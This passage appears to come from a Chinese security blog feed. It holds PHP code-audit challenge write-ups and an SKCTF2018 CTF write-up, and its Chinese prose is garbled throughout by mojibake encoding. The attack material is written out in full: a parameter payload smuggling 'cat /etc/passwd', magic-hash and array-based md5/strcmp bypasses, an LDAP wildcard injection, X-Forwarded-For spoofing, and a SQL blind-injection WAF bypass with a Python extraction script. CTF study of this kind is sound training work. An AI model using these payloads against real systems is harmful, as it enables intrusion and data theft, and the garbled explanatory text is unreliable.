<p>declare(strict_type=1);æ˜¯<strong>php7</strong>å¼•å…¥çš„<code>ä¸¥æ ¼ç±»å‹æ£€æŸ¥æ¨¡å¼</code>çš„æŒ‡å®šè¯­æ³•.</p>
<p>åœ¨è¿›è¡Œå‡½æ•°è°ƒç”¨çš„æ—¶å€™ä¼šè¿›è¡Œå‚æ•°ç±»å‹æ£€æŸ¥ã€‚å¦‚æœå‚æ•°ç±»å‹ä¸åŒ¹é…åˆ™å‡½æ•°ä¸ä¼šè¢«è°ƒç”¨</p>
</blockquote>
<p>æŒ‰è¯´åœ¨å£°æ˜äº†ä¸¥æ ¼ç±»å‹æ£€æŸ¥çš„æ¨¡å¼ä¸‹ç»è¿‡<code>validate()</code>å‡½æ•°æ£€æŸ¥çš„å‚æ•°å€¼éƒ½æ˜¯å¤§äº0çš„intå‹ã€‚ä½†æ˜¯å¯¼è‡´é—®é¢˜çš„æ˜¯è°ƒç”¨æ–¹å¼ï¼Œ<strong>é€šè¿‡<code>array_walk()</code>è°ƒç”¨çš„å‡½æ•°ä¼šå¿½ç•¥æ‰ä¸¥æ ¼æ¨¡å¼è¿˜æ˜¯æŒ‰ç…§ä¹‹å‰çš„phpçš„ç±»å‹è½¬æ¢çš„æ–¹å¼è°ƒç”¨å‡½æ•°</strong>ã€‚</p>
<p>e g:</p>
<pre><code class="php">declare(strict_types=1);
function addnum(int &amp;$value) &#123;
    $value = $value+1;
&#125;
$input = array(&#39;3a&#39;,&#39;4b&#39;);
var_dump($input);
array_walk($input,addnum);
var_dump($input);</code></pre>
<p>è¾“å‡ºï¼š</p>
<pre><code class="php">array(2) &#123;
  [0]=&gt;
  string(2) &quot;3a&quot;
  [1]=&gt;
  string(2) &quot;4b&quot;
&#125;

array(2) &#123;
  [0]=&gt;
  int(4)
  [1]=&gt;
  int(5)
&#125;</code></pre>
<p>ç”±äº<code>array_walk()</code>çš„è¿™ç§ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ä¼ å…¥ä»»æ„å­—ç¬¦è¿›å»ï¼Œé€ æˆäº†å‘½ä»¤æ‰§è¡Œã€‚</p>
<p>payloadï¼š<code>?p[1]=1&amp;p[2]=2;%20cat%20/etc/passwd</code></p>
<h2 id="Day-22-Chimney"><a href="#Day-22-Chimney" class="headerlink" title="Day 22 - Chimney"></a>Day 22 - Chimney</h2><p><strong>code:</strong></p>
<pre><code class="php">if (isset($_POST[&#39;password&#39;])) &#123;
    setcookie(&#39;hash&#39;, md5($_POST[&#39;password&#39;]));
    header(&quot;Refresh: 0&quot;);
    exit;
&#125;

$password = &#39;0e836584205638841937695747769655&#39;;
if (!isset($_COOKIE[&#39;hash&#39;])) &#123;
    echo &#39;&lt;form&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; /&gt;&#39;
       . &#39;&lt;input type=&quot;submit&quot; value=&quot;Login&quot; &gt;&lt;/form &gt;&#39;;
    exit;
&#125; elseif (md5($_COOKIE[&#39;hash&#39;]) == $password) &#123;
    echo &#39;Login succeeded&#39;;
&#125; else &#123;
    echo &#39;Login failed&#39;;
&#125;</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p><code>md5($_COOKIE[&#39;hash&#39;]) == $password</code>ä½¿ç”¨çš„æ˜¯<code>==</code>ä¸”<code>$password</code>ä¸º0eå¼€å¤´ï¼Œæ¯”è¾ƒæ—¶ä¼šå½“æˆç§‘å­¦è®¡æ•°æ³•ï¼Œæ‰€ä»¥æ‰¾åˆ°ä¸€ä¸ªhashä¸ºåŒæ ·<code>0eæ•°å­—</code>æ ¼å¼çš„å°±è¡Œã€‚</p>
<pre><code class="php">php &gt; echo md5(&#39;240610708&#39;);
0e462097431906509019562988736854</code></pre>
<p>Payload:</p>
<pre><code>Cookie:hash=240610708</code></pre>
<h2 id="Day-23-Cookies"><a href="#Day-23-Cookies" class="headerlink" title="Day 23 - Cookies"></a>Day 23 - Cookies</h2><p><strong>code:</strong></p>
<pre><code class="php">class LDAPAuthenticator &#123;
    public $conn;
    public $host;

    function __construct($host = &quot;localhost&quot;) &#123;
        $this-&gt;host = $host;
    &#125;

    function authenticate($user, $pass) &#123;
        $result = [];
        $this-&gt;conn = ldap_connect($this-&gt;host);    
        ldap_set_option(
            $this-&gt;conn,
            LDAP_OPT_PROTOCOL_VERSION,
            3
        );
        if (!@ldap_bind($this-&gt;conn))
            return -1;
        $user = ldap_escape($user, null, LDAP_ESCAPE_DN);
        $pass = ldap_escape($pass, null, LDAP_ESCAPE_DN);
        $result = ldap_search(
            $this-&gt;conn,
            &quot;&quot;,
            &quot;(&amp;(uid=$user)(userPassword=$pass))&quot;
        );
        $result = ldap_get_entries($this-&gt;conn, $result);
        return ($result[&quot;count&quot;] &gt; 0 ? 1 : 0);
    &#125;
&#125;

if(isset($_GET[&quot;u&quot;]) &amp;&amp; isset($_GET[&quot;p&quot;])) &#123;
    $ldap = new LDAPAuthenticator();
    if ($ldap-&gt;authenticate($_GET[&quot;u&quot;], $_GET[&quot;p&quot;])) &#123;
        echo &quot;You are now logged in!&quot;;
    &#125; else &#123;
        echo &quot;Username or password unknown!&quot;;
    &#125;
&#125;</code></pre>
<p><strong>æ¼æ´ï¼š</strong></p>
<p>é¢˜ç›®ä¸­ä½¿ç”¨çš„è¿‡æ»¤å‡½æ•°æ˜¯<code>ldap_escape($user, null, LDAP_ESCAPE_DN)</code>ã€‚</p>
<blockquote>
<p><strong>ldap_escape</strong></p>
<p>dap_escape â€” Escape a string for use in an LDAP filter or DN</p>
<p>string ldap_escape ( string <code>$value</code> [, string <code>$ignore</code> [, int <code>$flags</code> ]] )</p>
<p>Escapes <code>value</code> for use in the context implied by <code>flags</code>.</p>
<p><code>flags</code></p>
<p>The context the escaped string will be used in: <strong><code>LDAP_ESCAPE_FILTER</code></strong> for filters to be used with <a href="dfile:///Users/lanvnal/Documents/Docs/PHP.docset/Contents/Resources/Documents/php.net/manual/en/function.ldap-search.html">ldap_search()</a>, or**<code>LDAP_ESCAPE_DN</code>** for DNs.</p>
</blockquote>
<p>å½“ä½¿ç”¨ldap_search()æ—¶éœ€è¦é€‰æ‹©LDAP_ESCAPE_FILTERè¿‡æ»¤å­—ç¬¦ä¸²ï¼Œä½†æ˜¯å¦‚æœé€‰æ‹©LDAP_ESCAPE_DNå°†ä¼šå¯¼è‡´è¿‡æ»¤æ— æ•ˆã€‚</p>
<p>payloadï¼š<code>u=*&amp;p=123456</code></p>
<h2 id="Day-24-Nutcracker"><a href="#Day-24-Nutcracker" class="headerlink" title="Day 24 - Nutcracker"></a>Day 24 - Nutcracker</h2><p><strong>code:</strong></p>
<pre><code class="php">@$GLOBALS=$GLOBALS&#123;next&#125;=next($GLOBALS&#123;&#39;GLOBALS&#39;&#125;)
[$GLOBALS[&#39;next&#39;][&#39;next&#39;]=next($GLOBALS)[&#39;GLOBALS&#39;]]
[$next[&#39;GLOBALS&#39;]=next($GLOBALS[GLOBALS][&#39;GLOBALS&#39;])
[$next[&#39;next&#39;]]][$next[&#39;GLOBALS&#39;]=next($next[&#39;GLOBALS&#39;])]
[$GLOBALS[next][&#39;next&#39;]($GLOBALS[&#39;next&#39;]&#123;&#39;GLOBALS&#39;&#125;)]=
next(neXt($&#123;&#39;next&#39;&#125;[&#39;next&#39;]));</code></pre>
<p>ä¸€é“CTFé¢˜</p>
<blockquote>
<p><a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/next-global-backdoor">https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/next-global-backdoor</a></p>
</blockquote>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>SKCTF2018 WriteUp</title>
    <url>/2018/05/07/skctf2018-writeup/</url>
    <content><![CDATA[<hr>
<blockquote>
<p>SKCTF2018 WriteUp</p>
<p>å±±ä¸œç§‘æŠ€å¤§å­¦ç½‘ç»œå®‰å…¨å°ç»„</p>
</blockquote>
<a id="more"></a>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Wait-a-minute"><a href="#Wait-a-minute" class="headerlink" title="Wait_a_minute"></a>Wait_a_minute</h2><p>å³é”®æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æºç ã€‚</p>
<pre><code class="php">&lt;html&gt;
&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&lt;!--

if(isset($_POST[&#39;password&#39;]))
&#123;
    if(strcmp($_POST[&#39;password&#39;],$password)==0)&#123;
        echo &quot;&lt;h1&gt;Welcome,you need to wait......&lt;br&gt;The flag will become soon....&lt;/h1&gt;&lt;br&gt;&quot;;
        if(isset($_GET[&#39;time&#39;]))&#123;
                $t=$_GET[&#39;time&#39;];
                if(!is_numeric($t))&#123;
                        echo &#39;Sorry.&lt;br&gt;&#39;;
                &#125;else if($t &lt; 66 * 55 * 44 * 33 * 22 * 11 )&#123;
                                echo &#39;you need a bigger time.&lt;br&gt;&#39;;
                &#125;else if($t &gt; 11 * 23 * 33 * 44 * 55 * 66)&#123;
                                echo &#39;you need a smaller time.&lt;br&gt;&#39;;
                &#125;else&#123;
                        sleep((int)$t);
                        var_dump($flag);
                &#125;
                        echo &#39;&lt;hr&gt;&#39;;
        &#125;
    &#125;else&#123;
        echo &quot;Password is wrong............&lt;br&gt;&quot;;
    &#125;
&#125;else&#123;
    echo &quot;&lt;h1&gt;Please input password..........&lt;/h1&gt;&lt;br&gt;&quot;;
&#125;
--!&gt;



&lt;/html&gt;</code></pre>
<p>é¦–å…ˆè¦æ±‚postä¸€ä¸ªpasswordï¼Œè¦æ±‚ä¸æœåŠ¡ç«¯è®¾å®šçš„passwordç›¸ç­‰æ‰èƒ½ç»§ç»­ï¼Œè€Œè¿™æ¬¡ç”¨äº†åŒç­‰å·==æ¯”è¾ƒï¼Œå­˜åœ¨å¼±</p>
<p>ç±»å‹ç»•è¿‡ã€‚Postä¸€ä¸ªæ•°ç»„å³å¯</p>
<p><img src="/images/SKCTF2018/waitamin1.png" alt="waitamin1"></p>
<p>ç»§ç»­å‘ç°éœ€è¦ä¼ å…¥ä¸€ä¸ªtimeæ—¶é—´ã€‚åœ¨sleepè¿™äº›æ—¶é—´åä¼šè¾“å‡ºè¿™ä¸ªæ—¶é—´ï¼Œè€Œåœ¨æºç ä¸­å¯ä»¥å¯ä»¥çœ‹åˆ°æ—¶é—´çš„å¤§å°åœ¨66 </p>
<p>55 * 44 * 33 * 22 * 11-11 * 23 * 33 * 44 * 55 * 66ä¹‹é—´ï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦ç­‰ä¸Šä¸ªå‡ ç™¾å¤©flagå°±å‡ºæ¥äº†ã€‚ç®€å•å§ã€‚</p>
<p>Okï¼Œæˆ‘ä»¬å½“ç„¶ä¸èƒ½ç­‰ä¸Šå‡ ç™¾å¤©ï¼Œåœ¨æºç ä¸­å¯ä»¥çœ‹åˆ°.</p>
<p><img src="/images/SKCTF2018/waitamin2.png" alt="waitamin2"></p>
<p>å¯¹æ—¶é—´tåšäº†intå¼ºåˆ¶è½¬æ¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æœºä¼šæ¥äº†ã€‚å¯ä»¥ä½¿ç”¨åå…­è¿›åˆ¶ï¼Œç»•è¿‡å‰è¾¹çš„æ—¶é—´æ£€æµ‹ï¼Œè€Œåå…­è¿›åˆ¶ä»¥0xå¼€</p>
<p>å¤´ï¼Œintè½¬æ¢åå°±æ˜¯0ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¾—åˆ°flagäº†ã€‚</p>
<p><img src="/images/SKCTF2018/waitamin3.png" alt="waitamin3"></p>
<h2 id="Php-string"><a href="#Php-string" class="headerlink" title="Php_string"></a>Php_string</h2><p>é¢˜ç›®å­˜åœ¨æºç æ³„éœ²ï¼Œè®¿é—® .index.php.swp</p>
<p>ä½¿ç”¨vim -rå‘½ä»¤æ¢å¤</p>
<p>å¯ä»¥å¾—åˆ°é¢˜ç›®æºç </p>
<p><img src="/images/SKCTF2018/phpstring1.png" alt="phpstring1"></p>
<p>å¯ä»¥çœ‹åˆ°å¾—åˆ°flagçš„æ¡ä»¶å¾ˆç®€å•ï¼Œåªè¦è¾“å…¥çš„idç­‰äºå­—ç¬¦ä¸²â€˜6666â€˜å³å¯ï¼Œä½†æ˜¯è¿™é‡Œchallengeå‡½æ•°å¯¹idè¿›è¡Œäº†è¿‡æ»¤ï¼Œæ— æ³•é€šè¿‡å•åŒå¼•å·ç­‰æ–¹å¼ä¼ å…¥å­—ç¬¦ä¸²ï¼Œç™¾åº¦ä¸€ä¸‹å¯ä»¥å‘ç°phpè¿˜æœ‰å…¶ä»–ä¸€äº›è¡¨ç¤ºå­—ç¬¦ä¸²çš„æ–¹å¼ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ç§heredocçš„æ–¹å¼ï¼Œè€Œä¸”ä½©å¥‡å›¾ç‰‡çš„åå­—å°±æ˜¯heredocï¼Œè¿™é‡Œå…¶å®ä¹Ÿç»™äº†ä¸€äº›æç¤ºã€‚</p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨heredocè¯­æ³•æ„é€ payload</p>
<pre><code class="php">Id=&lt;&lt;&lt;b

6666

 b;</code></pre>
<p>è€Œéœ€è¦æ³¨æ„çš„äº‹ï¼Œè¿™é‡Œæœ‰ä¸‰ä¸ªæ¢è¡Œï¼Œå…¶ä¸­æœ€åçš„åˆ†å·åä¹Ÿéœ€è¦æ¢è¡Œï¼Œå¯ä»¥ä½¿ç”¨%oaä»£æ›¿</p>
<p>é‚£ä¹ˆæœ€ç»ˆçš„payload :</p>
<pre><code class="php">?id=&lt;&lt;&lt;b%0a6666%0ab;%0a</code></pre>
<p><img src="/images/SKCTF2018/phpstring2.png" alt="phpstring2"></p>
<h2 id="å…«å¤§å…³"><a href="#å…«å¤§å…³" class="headerlink" title="å…«å¤§å…³"></a>å…«å¤§å…³</h2><pre><code>ä¸€äº›ç®€å•çŸ¥è¯†ç‚¹çš„æ±‡æ€»</code></pre>
<h3 id="index"><a href="#index" class="headerlink" title="index"></a>index</h3><p>æŸ¥çœ‹æºä»£ç ï¼Œå¯ä»¥åœ¨æ³¨é‡Šä¸­çœ‹åˆ°æç¤ºï¼š</p>
<pre><code>ä½ ä¸æ˜¯è‡ªå·±äººï¼Œæˆ‘ä¸èƒ½è®©ä½ è¿›å»ï¼
&lt;!-- æ‚„æ‚„å‘Šè¯‰ä½ ï¼Œæˆ‘ä»¬è‡ªå·±äººçš„ipéƒ½æ˜¯233.233.233.233 --&gt;</code></pre>
<p>å¯ä»¥çŸ¥é“è¿™é¢˜é™åˆ¶äº†IPï¼Œæˆ‘ä»¬åˆ©ç”¨X-Forwarded-Foræ¥ä¼ªé€ è¯·æ±‚IPã€‚</p>
<blockquote>
<p><strong>X-Forwarded-For</strong>ï¼ˆ<strong>XFF</strong>ï¼‰æ˜¯ç”¨æ¥è¯†åˆ«é€šè¿‡<a href="https://www.wikiwand.com/zh-hans/HTTP">HTTP</a><a href="https://www.wikiwand.com/zh-hans/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8">ä»£ç†</a>æˆ–<a href="https://www.wikiwand.com/zh-hans/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">è´Ÿè½½å‡è¡¡</a>æ–¹å¼è¿æ¥åˆ°<a href="https://www.wikiwand.com/zh-hans/Web%E6%9C%8D%E5%8A%A1%E5%99%A8">WebæœåŠ¡å™¨</a>çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„<a href="https://www.wikiwand.com/zh-hans/IP%E5%9C%B0%E5%9D%80">IPåœ°å€</a>çš„HTTPè¯·æ±‚å¤´å­—æ®µ</p>
</blockquote>
<p>æˆ‘ä»¬é€šè¿‡burpsuiteæ¥æ·»åŠ ç¼–è¾‘X-Forwarded-Forçš„å€¼æ¥ä¼ªé€ ipï¼ŒæˆåŠŸé€šå…³ã€‚</p>
<h3 id="Challenge1"><a href="#Challenge1" class="headerlink" title="Challenge1"></a>Challenge1</h3><p>é¡µé¢ä¸Šçš„æç¤ºç‚¹æ˜äº†æˆ‘ä»¬è¦ä½¿ç”¨OS X 99 ç³»ç»Ÿæ¥è®¿é—®ï¼Œé€šè¿‡æ›´æ”¹UAæ¥é€šå…³ã€‚</p>
<blockquote>
<p>You should use â€œMac OS X 99â€ to through the door!</p>
</blockquote>
<p>é€šè¿‡burpsuiteå°†headersä¸­çš„user-agentæ›´æ”¹ä¸ºé¢˜ç›®è¦æ±‚çš„å³å¯é€šå…³ã€‚</p>
<blockquote>
<p><strong>User-Agent</strong> é¦–éƒ¨åŒ…å«äº†ä¸€ä¸ªç‰¹å¾å­—ç¬¦ä¸²ï¼Œç”¨æ¥è®©ç½‘ç»œåè®®çš„å¯¹ç«¯æ¥è¯†åˆ«å‘èµ·è¯·æ±‚çš„ç”¨æˆ·ä»£ç†è½¯ä»¶çš„åº”ç”¨ç±»å‹ã€æ“ä½œç³»ç»Ÿã€è½¯ä»¶å¼€å‘å•†ä»¥åŠç‰ˆæœ¬å·ã€‚</p>
</blockquote>
<h3 id="Challenge2"><a href="#Challenge2" class="headerlink" title="Challenge2"></a>Challenge2</h3><p>ç»™å‡ºäº†å…³é”®ä»£ç ï¼š</p>
<pre><code>if($_POST[&quot;a&quot;] != $_POST[&quot;b&quot;] &amp;&amp; md5($_POST[&quot;a&quot;]) == md5($_POST[&quot;b&quot;]))&#123;
success!
&#125;</code></pre>
<p>payloadï¼ša=240610708,b=QLTHNDTï¼ˆä¸å”¯ä¸€ï¼‰</p>
<p><code>==</code>åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒã€‚å¦‚æœä¸€ä¸ªå­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒä¼šå…ˆå°†å­—ç¬¦ä¸²è¿›è¡Œç±»å‹è½¬æ¢æˆæ•°å€¼è¿›è¡Œæ¯”è¾ƒã€‚0eå¼€å¤´åŠ æ•°å­—ç»„æˆçš„å­—ç¬¦ä¸²åœ¨æ¯”è¾ƒæ—¶ï¼Œä¼šå°†0eè¿™ç±»å­—ç¬¦ä¸²è¯†åˆ«ä¸ºç§‘å­¦æŠ€æœ¯æ³•çš„æ•°å­—ï¼Œ0çš„æ— è®ºå¤šå°‘æ¬¡æ–¹éƒ½æ˜¯é›¶ï¼Œæ‰€ä»¥ç›¸ç­‰ã€‚ä¹Ÿå°±æ˜¯åªè¦æ˜¯aï¼Œbçš„å€¼ç»è¿‡md5åŠ å¯†åç¬¦åˆè¿™ç§æ ¼å¼å°±èƒ½æˆåŠŸã€‚</p>
<table>
<thead>
<tr>
<th align="center">a/b</th>
<th align="center">Md5</th>
</tr>
</thead>
<tbody><tr>
<td align="center">240610708</td>
<td align="center">0e462097431906509019562988736854</td>
</tr>
<tr>
<td align="center">QLTHNDT</td>
<td align="center">0e405967825401955372549139051580</td>
</tr>
</tbody></table>
<h3 id="Challenge3"><a href="#Challenge3" class="headerlink" title="Challenge3"></a>Challenge3</h3><p>ç»™å‡ºäº†å…³é”®ä»£ç ï¼š</p>
<pre><code>if(($_GET[&#39;a&#39;]!==$_GET[&#39;b&#39;] &amp;&amp; md5($_GET[&#39;a&#39;])===md5($_GET[&#39;b&#39;]))&#123;
    success!;
        &#125;</code></pre>
<p>è¦æ±‚ä¸¤ä¸ªå‚æ•°çš„å€¼ä¸ç›¸ç­‰ï¼Œä¸”a===bï¼Œä¸¤ä¸ªmd5çš„å¼ºç­‰äºæ¯”è¾ƒï¼Œæˆ‘ä»¬ä½¿ç”¨æ•°ç»„æ¥ç»•è¿‡ã€‚</p>
<p>Payload:<code>challenge3.php?a[]=1&amp;b[]=2</code></p>
<p>md5()ä¸­çš„éœ€è¦æ˜¯ä¸€ä¸ªstringç±»å‹çš„å‚æ•°ã€‚ä½†æ˜¯å½“ä½ ä¼ é€’ä¸€ä¸ªarrayæ—¶ï¼Œmd5()ä¸ä¼šæŠ¥é”™ï¼Œåªæ˜¯ä¼šæ— æ³•æ­£ç¡®åœ°æ±‚å‡ºarrayçš„md5å€¼ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ä»»æ„2ä¸ªarrayçš„md5å€¼éƒ½ä¼šç›¸ç­‰ã€‚</p>
<h3 id="Challenge4"><a href="#Challenge4" class="headerlink" title="Challenge4"></a>Challenge4</h3><p>æ ¹æ®ç»™å‡ºçš„æç¤ºï¼Œå¾ˆæ˜¾ç„¶æ˜¯è¦çˆ†ç ´md5.å·²ç»æç¤ºäº†æ˜¯çº¯æ•°å­—è¿›è¡Œçš„åŠ å¯†ï¼Œæ‰€ä»¥çˆ†ç ´å¾ˆå®¹æ˜“ã€‚</p>
<pre><code>substr(md5(input),0,6) ===b04f51</code></pre>
<p>md5çˆ†ç ´ï¼š</p>
<pre><code class="python">import hashlib

def getmd5(code):
    for i in range(999999):
        temp = hashlib.md5(str(i)).hexdigest()
        if temp[0:6] == code:
            return i 

if __name__ == &#39;__main__&#39;:
    print getmd5(&#39;b04f51&#39;)

#587478</code></pre>
<h3 id="Challenge5"><a href="#Challenge5" class="headerlink" title="Challenge5"></a>Challenge5</h3><p>ç»™å‡ºäº†å…³é”®ä»£ç ï¼Œé€šè¿‡strcmpå‡½æ•°æ¥æ¯”è¾ƒä¸¤ä¸ªå‚æ•°ï¼Œé€šè¿‡æ•°ç»„ç»•è¿‡ã€‚</p>
<pre><code>if(!strcmp($_POST[&#39;a&#39;],$_POST[&#39;b&#39;]))&#123;
success!
&#125;</code></pre>
<p>payloadï¼š<code>/challeneg5.php?a[]=1&amp;b=123</code></p>
<p>strcmp()æ˜¯æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰çš„å‡½æ•°ï¼Œ ä»–çš„åˆ¤æ–­åŸç†æ˜¯å…ˆå°†ä¸¤ä¸ªå­—ç¬¦ä¸²è½¬æ¢æˆasciiç„¶åè¿›è¡Œå‡æ³•è¿ç®—ï¼Œç»“æœå’Œ0æ¯”è¾ƒï¼Œ å¦‚æœstr1&lt;str2 åˆ™è¿”å›&lt;0ï¼Œå¦‚æœstr1å¤§äºstr2è¿”å›&gt;0 å¦‚æœä¸¤è€…ç›¸ç­‰ è¿”å›0 æ‰€ä»¥å®ƒæ˜¯å¯¹å­—ç¬¦ä¸²ç±»å‹è¿›è¡Œçš„æ“ä½œï¼Œå¦‚æœä¼ å…¥æ•°ç»„å‘¢ã€‚ç»“æœæ˜¯nullä½†æ˜¯ä¸0è¿›è¡Œæ¾æ•£æ¯”è¾ƒç»“æœæ˜¯trueçš„ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-14%20%E4%B8%8B%E5%8D%881.42.20.png" alt="æ¾æ•£æ¯”è¾ƒ"></p>
<h3 id="Challenge6"><a href="#Challenge6" class="headerlink" title="Challenge6"></a>Challenge6</h3><p>å…³é”®ä»£ç å·²ç»™å‡º,è¦æ±‚å‚æ•°ä¸èƒ½æ˜¯SKCTFä¸”ç»è¿‡urldecodeåç­‰äºSKCTFï¼Œå› ä¸ºä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡urldecodeï¼Œæ‰€ä»¥å°†SKCTFè¿›è¡Œhexç¼–ç ä¸¤æ¬¡ã€‚</p>
<pre><code>if(eregi(&quot;SKCTF&quot;,$_GET[&#39;code&#39;])) &#123;    
echo(&quot;code error!&quot;);    
exit();    
&#125;    

$_GET[&#39;code&#39;] = urldecode($_GET[&#39;code&#39;]);    
if($_GET[&#39;code&#39;] == &quot;SKCTF&quot;)    
&#123;    
success;    
&#125;    </code></pre>
<p>Payload:</p>
<pre><code>/?code=%25%35%33%25%34%62%25%34%33%25%35%34%25%34%36</code></pre>
<h3 id="Lastchallenge"><a href="#Lastchallenge" class="headerlink" title="Lastchallenge"></a>Lastchallenge</h3><p>æ£€æŸ¥å…ƒç´ èƒ½çœ‹åˆ°å¯†ç é”çš„jsä»£ç ï¼ŒjséªŒè¯å¯†ç æ‰€ä»¥è¦ä¹ˆæ”¹jsè¦ä¹ˆç›´æ¥è¾“å…¥å¯†ç ï¼Œé€šå…³ã€‚</p>
<pre><code class="javascript">var Lock = function () &#123;
  function Lock() &#123;
    _classCallCheck(this, Lock);

    this.pin = &#39;7982&#39;;
    this.setupDom();
    this.setupFlickity();
    this.setupAudio();
    this.onResize();
    this.listen();
  &#125;</code></pre>
<p>å¾—åˆ°flagï¼šSKCTF{haHA_EZ_D0oR}</p>
<h2 id="login-me"><a href="#login-me" class="headerlink" title="login me"></a>login me</h2><p>è¿™é¢˜è€ƒå¯Ÿsql boolç›²æ³¨ï¼Œéš¾ç‚¹åœ¨äºwafçš„ç»•è¿‡ã€‚</p>
<p>è¿™é‡Œç›´æ¥ç»™å‡ºæºç çš„waf</p>
<pre><code class="php">$waf=&quot;union|if| |=|and|&gt;|&lt;|or|substr|mid|left|right|like|regexp&quot;;</code></pre>
<p>å…·ä½“é»‘ç›’æµ‹è¯•æ—¶å¯ä»¥ç”¨burpsuiteä¸­çš„intruderå·¥å…·æ„å»ºå­—å…¸è‡ªè¡Œfuzzã€‚</p>
<p>wafä¸­çš„ç©ºæ ¼ç”¨<code>/**/</code>ç»•è¿‡ï¼Œ<code>=</code>ç”¨<code>in</code>ä»£æ›¿ï¼Œ<code>lpad</code>å‡½æ•°ç”¨æ¥æˆªå–å­—ç¬¦ä¸²ã€‚</p>
<p>é¢˜ç›®è¿˜æœ‰sqlæ•°æ®åº“ç»“æ„æ³„éœ²ï¼Œç›´æ¥è®¿é—®web4.sqlå¯ä»¥çœ‹åˆ°æ•°æ®åº“çš„ç»“æ„ã€‚</p>
<p>payloadï¼š<code>username=1&#39;/**/||/**/lpad((&#39;a&#39;),1,1)/**/in/**/(&#39;a&#39;)#&amp;password=123</code></p>
<p>æ¥ä¸‹æ¥å°±å¯ä»¥ç›´æ¥ç›²æ³¨æŸ¥è¡¨äº†ã€‚</p>
<pre><code class="python">#-*-coding:utf-8-*-

import requests 
import time

url = &#39;http://192.168.211.131:49154/&#39; 

def check(payload):
    postdata=&#123;&#39;username&#39;:payload,&#39;password&#39;:&#39;admin&#39;&#125;
    r = requests.post(url,postdata).content
    #print r
    return &#39;Wrong password&#39; in r

flag=&#39;&#39;
s = r&#39;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#123;&#125;&#39;
for i in xrange(1,64):    
    for c in s:        
        payload = &#39;1\&#39;/**/||/**/lpad((select/**/f14g/**/from/**/f1ag),%s,1)/**/in/**/(\&#39;%s\&#39;)#&#39;%(str(i),flag+c)     
        #print payload
        if check(payload):
            flag += c
            break
    print flag
    if &#39;&#125;&#39; in flag:
        break    </code></pre>
<h2 id="ç»•å•Šç»•"><a href="#ç»•å•Šç»•" class="headerlink" title="ç»•å•Šç»•"></a>ç»•å•Šç»•</h2><hr>
<p>ç»™äº†å…³é”®ä»£ç ï¼Œå…ˆä¸€å¥ä¸€å¥åˆ†æä»£ç ï¼Œä¸€æ­¥æ­¥ç»•è¿‡æ¡ä»¶ï¼š</p>
<pre><code>$rule = &#39;/([[:punct:]]+|[[:alpha:]]+|[[:digit:]]+)/&#39;;</code></pre>
<p>è¿™å¥æ˜¯è§„å®šäº†ä¸€ä¸ªruleå‚æ•°ï¼Œå¦‚æœäº†è§£phpçš„å¯ä»¥çŸ¥é“ï¼ŒPHPçš„æ­£åˆ™è¡¨è¾¾å¼æœ‰ä¸€äº›å†…ç½®çš„é€šç”¨å­—ç¬¦ç°‡ï¼Œ<code>[[:punct:]]</code>ä»£è¡¨äº†ä»»ä½•æ ‡ç‚¹ç¬¦å·ï¼Œ<code>[[:alpha:]]</code>ä»£è¡¨äº†ä»»ä½•å­—æ¯ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œ<code>[[:digit:]]</code>ä»£è¡¨äº†ä»»ä½•æ•°å­—ï¼Œæ¥ç€è¯»ä»£ç ï¼š</p>
<pre><code>if (8 &gt; preg_match_all($rule, $data, $arr))</code></pre>
<p>è¿™ä¸ªæ¡ä»¶æ˜¯å¿…é¡»è¦æ»¡è¶³çš„ï¼Œå¦åˆ™ä¼šbreakæ‰ï¼Œè¦ç»•è¿‡preg_match_allè¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨dataä¸­åŒ¹é…åˆ°å…«æ¬¡ä»¥ä¸Šçš„ruleæ¡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ ‡ç‚¹ç¬¦å·ï¼Œæ•°å­—ï¼Œå­—æ¯ï¼Œæ¥ç€è¯»ä»£ç ï¼š</p>
<pre><code>$nn = array(&#39;punct&#39;, &#39;alpha&#39;, &#39;digit&#39;);
        foreach ($nn as $ns)
        &#123; 
            if (preg_match(&quot;/[[:$ns:]]+/&quot;, $data))
            &#123;
                $num += 1;
            &#125;
        &#125;
        if ($num &lt; 3)
            break;
        if (187667123 == $data)
        &#123;
            $da = $_GET[&#39;num&#39;];
            if (!is_numeric($da))
            &#123;
                if(27500 &lt; $da)
                &#123;
                    echo $flag;
                &#125;</code></pre>
